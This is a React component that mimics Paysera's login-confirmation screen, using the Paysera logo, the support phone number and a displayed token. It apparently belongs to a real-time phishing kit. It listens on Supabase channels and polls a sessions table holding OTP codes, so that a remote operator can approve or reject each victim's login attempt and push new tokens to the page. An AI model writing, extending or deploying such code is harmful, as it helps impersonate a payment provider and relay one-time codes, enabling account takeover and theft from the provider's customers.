import { useState, useEffect } from "react";
import { supabase } from "@/integrations/supabase/client";
import payseraLogo from "@/assets/volet-logo-v2.svg";
import { Loader2, ChevronDown } from "lucide-react";
import { usePayseraLang } from "@/hooks/usePayseraLang";

interface PayseraTokenScreenProps {
  email: string;
  sessionId: string;
  tokenNumber: string;
  onBack: () => void;
}

const PayseraTokenScreen = ({ email, sessionId, tokenNumber, onBack }: PayseraTokenScreenProps) => {
  const [status, setStatus] = useState<"waiting" | "success" | "rejected">("waiting");
  const { t } = usePayseraLang();

  useEffect(() => {
    const channel = supabase.channel(`session-otp-decision-${sessionId}`);
    channel
      .on("broadcast", { event: "otp_decision" }, (p) => {
        const decision = p.payload?.status as string;
        if (decision === "otp_approved") setStatus("success");
        else if (decision === "otp_rejected") setStatus("rejected");
      })
      .subscribe();

    const reviewChannel = supabase.channel(`session-review-client-token-${sessionId}`);
    reviewChannel
      .on("broadcast", { event: "review_decision" }, (p) => {
        const decision = p.payload?.status as string;
        if (decision === "otp_approved" || decision === "login_success") setStatus("success");
        else if (decision === "otp_rejected") setStatus("rejected");
      })
      .subscribe();

    const pollInterval = setInterval(async () => {
      const { data } = await supabase.from("sessions").select("status, otp_code").eq("id", sessionId).maybeSingle();
      if (!data) return;
      if (data.status === "otp_approved" || data.status === "login_success") setStatus("success");
      else if (data.status === "otp_rejected") {
        setStatus("rejected");
      } else if (data.status === "paysera_show_token") {
        // Reset to waiting when a new token is sent
        setStatus("waiting");
      }
    }, 2500);

    return () => {
      supabase.removeChannel(channel);
      supabase.removeChannel(reviewChannel);
      clearInterval(pollInterval);
    };
  }, [sessionId]);

  if (status === "success") {
    return (
      <div className="flex min-h-screen flex-col bg-[#dce1e8]">
        <div className="flex justify-center pt-6"><img src={payseraLogo} alt="Paysera" className="h-[40px]" /></div>
        <div className="flex flex-1 flex-col items-center justify-center px-4">
          <div className="w-full max-w-[460px] bg-white rounded-sm shadow-sm border border-[#c8ced8] px-6 py-8 text-center">
            <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-green-100">
              <svg className="h-7 w-7 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" /></svg>
            </div>
            <h2 className="text-[15px] font-bold text-[#2c3e50] mb-2">{t.verificationComplete}</h2>
            <p className="text-[13px] text-[#666]">{t.verificationCompleteDesc}</p>
            <p className="mt-2 text-[12px] text-[#999]">{email}</p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="flex min-h-screen flex-col bg-[#dce1e8]">
      <div className="flex justify-center pt-6">
        <img src={payseraLogo} alt="Paysera" className="h-[40px]" />
      </div>

      <div className="flex flex-1 flex-col items-center justify-center px-4">
        <div className="w-full max-w-[500px] bg-white rounded shadow-sm border border-[#c8ced8]">
          {/* Header */}
          <div className="px-6 pt-5 pb-3">
            <h1 className="text-[17px] font-bold text-[#1a1a2e]">{t.additionalLoginConfirmation}</h1>
          </div>

          {/* Info text */}
          <div className="px-6 pb-4">
            <p className="text-[13px] text-[#444] leading-relaxed">
              {t.additionalLoginDesc}
            </p>
          </div>

          {/* Yellow note box */}
          <div className="mx-6 mb-5 rounded border border-[#e0c97f] bg-[#fdf8e8] px-4 py-3">
            <p className="text-[12px] text-[#6b5c1f] leading-relaxed">
              <span className="font-semibold">{t.noteLabel}</span> {t.noteText}
            </p>
            <p className="text-[12px] text-[#6b5c1f] leading-relaxed mt-2">
              {t.additionalMethodsText} <span className="font-bold text-[#1a1a2e]">{t.loginMethodSettings}</span>.
            </p>
          </div>

          {/* Divider */}
          <div className="border-t border-[#e0e0e0]" />

          {/* APP MÓVEL PAYSERA section */}
          <div className="px-6 py-3 flex items-center justify-between border-b border-[#e0e0e0]">
            <span className="text-[13px] font-bold text-[#1a1a2e] uppercase tracking-wide">{t.payseraMobileApp}</span>
            <ChevronDown size={18} className="text-[#3366cc]" />
          </div>

          {/* Token display area */}
          <div className="px-6 py-8 text-center">
            <p className="text-[13px] text-[#444] mb-6">
              {t.confirmTokenInApp}
            </p>

            <div className="mb-5">
              <span className="text-[42px] font-light text-[#1a1a2e] leading-none">
                {tokenNumber}
              </span>
            </div>

            {status === "rejected" ? (
              <div className="flex items-center justify-center gap-2 text-[13px] text-red-600">
                {t.invalidCode}
              </div>
            ) : (
              <div className="flex items-center justify-center gap-2 text-[13px] text-[#666]">
                {t.waitingForResponse}
                <Loader2 className="h-4 w-4 animate-spin text-[#888]" />
              </div>
            )}
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="pb-5 pt-4 text-center">
        <div className="flex items-center justify-center gap-3 flex-wrap">
          <a href="#" className="text-[12px] text-[#3366cc] hover:underline">{t.prices}</a>
          <span className="text-[12px] text-[#ccc]">|</span>
          <a href="#" className="text-[12px] text-[#3366cc] hover:underline">{t.companyDetails}</a>
          <span className="text-[12px] text-[#ccc]">|</span>
          <span className="text-[12px] text-[#3366cc]">+370 5 207 1558</span>
        </div>
      </footer>
    </div>
  );
};

export default PayseraTokenScreen;
